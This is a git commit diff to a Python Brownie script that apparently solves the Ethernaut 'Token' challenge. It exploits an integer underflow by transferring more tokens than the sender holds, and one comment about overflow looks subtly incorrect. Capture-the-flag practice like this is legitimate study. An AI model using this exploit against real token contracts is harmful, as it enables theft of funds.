5a49d2d1d935851c53e85520a744de7a457b75d7
fahraday <ghosterinc@gmail.com>
2022-04-18 03:03:17 -0400

    fix: changing structure of the submit function

--- ethernaut_5_token/scripts/hack.py
+++ ethernaut_5_token/scripts/hack.py
@@ -1,6 +1,6 @@
 from brownie import interface, accounts, config
 
-INSTANCE_ADDRESS = "0x586B33801119747631A650E7A026837945850988"
+INSTANCE_ADDRESS = "0x8D5c6BadA135ea239cE3d4A491a18b9F0eB2F390"
 ACCOUNT = accounts.add(config["wallets"]["from_key"])
 
 ADDRESS_TO_SEND = "0x468F2866Cd6aEcf640644885F6Cad63Ff4f9BC4c"
@@ -10,7 +10,9 @@ def hack():
     instance_contract = interface.IToken(INSTANCE_ADDRESS)
 
     # hack the contract
-    tx = instance_contract.transfer(ADDRESS_TO_SEND, 100000000000000000000000000000000000000000000000000000000000000000000000000, {"from": ACCOUNT})
+    tx = instance_contract.transfer(ADDRESS_TO_SEND, 21, {"from": ACCOUNT}) 
+    # tx = instance_contract.transfer(ADDRESS_TO_SEND, 2**256 + 25, {"from": ACCOUNT}) for overflow
+
     tx.wait(1)
         
     print(f"Contract has been hacked. Now we have {instance_contract.balanceOf(ACCOUNT)} tokens")
